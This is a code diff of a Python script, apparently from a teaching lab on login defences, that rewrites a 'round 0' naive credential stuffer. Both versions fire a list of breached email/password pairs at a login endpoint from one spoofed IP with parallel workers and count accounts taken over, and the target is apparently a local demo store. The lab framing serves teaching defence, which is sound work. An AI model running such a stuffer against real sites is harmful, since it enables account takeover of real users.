@@ -1,55 +1,34 @@
-"""Round 0 attack — naive async credential stuffer.
+"""
+Round 0 attack: the naive stuffer.
 
-The baseline the whole chapter pushes against: one machine, one IP, maximum
-concurrency, the raw 2000-pair combo list fired at /login. Against an undefended
-endpoint it simply walks the list and collects every valid pair. It is also the
-easiest thing in the world to throttle, which is the point of Round 1.
+The baseline the whole chapter pushes against: one machine, one IP, 16 workers, the raw 1000-pair
+combo list fired at POST /api/login. Against an undefended endpoint it simply walks the list and
+collects every valid pair (the 30 accounts that reuse a breached password). It is also the easiest
+thing in the world to throttle, which is the point of Round 1.
 
-Run (with the demo store up at DEFENSE_LEVEL=0):
     python attacks/round0_naive_stuffer.py
 """
 
-from __future__ import annotations
+from _common import LabClient, combo_list, is_success, login, map_threads, report, world_pool
 
-import asyncio
-
-import httpx
-
-from _common import BASE_URL, edge_headers, is_success, load_combos, require_local_target
-
-ATTACKER_IP = "198.51.100.10"   # one datacenter address (documentation range)
-CONCURRENCY = 20
-ACTOR = "bot:round0"
+ACTOR = "bot:naive"
+ATTACKER_IP = world_pool("cloud_vm")[0]         # one datacenter address
 
 
-async def run() -> dict:
-    require_local_target(BASE_URL)
-    combos = load_combos()
-    hits: list[str] = []
-    sem = asyncio.Semaphore(CONCURRENCY)
+def run():
+    hits = []
 
-    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
-        async def attempt(email: str, pw: str):
-            async with sem:
-                try:
-                    r = await client.post("/login", json={"email": email, "password": pw},
-                                          headers=edge_headers(ACTOR, ATTACKER_IP))
-                    if is_success(r):
-                        hits.append(email)
-                except httpx.RequestError:
-                    pass
+    def attempt(pair):
+        email, pw = pair
+        if is_success(login(LabClient(ACTOR, ip=ATTACKER_IP), email, pw)):
+            hits.append(email)
 
-        await asyncio.gather(*(attempt(e, p) for e, p in combos))
-
-    return {"attack": ACTOR, "attempts": len(combos), "accounts_taken_over": len(hits),
-            "hits": sorted(hits)}
-
-
-def main():
-    result = asyncio.run(run())
-    print(f"[{result['attack']}] {result['attempts']} attempts -> "
-          f"{result['accounts_taken_over']} accounts taken over")
+    pairs = combo_list()
+    map_threads(attempt, pairs)
+    return {"attacker": ACTOR, "attempted": len(pairs), "succeeded": len(hits), "accounts_taken_over": len(hits)}
 
 
 if __name__ == "__main__":
-    main()
+    out = run()
+    print(f"[{ACTOR}] {out['attempted']} attempts -> {out['accounts_taken_over']} accounts taken over")
+    report(**out)
